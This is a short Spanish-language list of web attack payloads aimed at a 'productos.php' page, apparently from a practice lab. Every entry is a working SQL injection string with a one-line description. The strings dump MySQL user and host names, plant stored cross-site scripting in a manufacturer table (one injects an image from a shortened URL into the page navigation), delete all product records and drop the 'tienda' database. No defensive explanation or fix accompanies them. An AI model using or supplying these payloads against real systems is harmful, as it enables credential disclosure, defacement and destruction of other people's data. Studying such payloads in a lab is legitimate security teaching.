## Payloads

- Mostrar todos los usuarios del servidor:
  ```
  /productos.php?id=-1 union select 1,2,group_concat(user, '@', host),4 from mysql.user--
  ```
- Concatenar al nombre del fabricante un código malicioso:
  ```
  /productos.php?id=-1; insert into fabricante values(null, 'Código malicioso'); --
  ```
- Registrar un fabricante con código que muestre una alerta:
  ```
  /productos.php?id=-1; insert into fabricante values(null, '<script>alert("Hackeado")</script>'); --
  ```
- Registrar un fabricante con código malicioso que muestra una imagen arriba de la tabla:
  ```
  /productos.php?id=-1; insert into fabricante values(null, '<script>document.querySelector("nav").innerHTML="<img src=https://shorturl.at/PO312>"</script>'); --
  ```
- Borrar todos los registros de la tabla producto:
  ```
  /productos.php?id=-1; delete from producto; --
  ```
- Eliminar la base de datos:
  ```
  /productos.php?id=-1; drop database tienda; --
  ```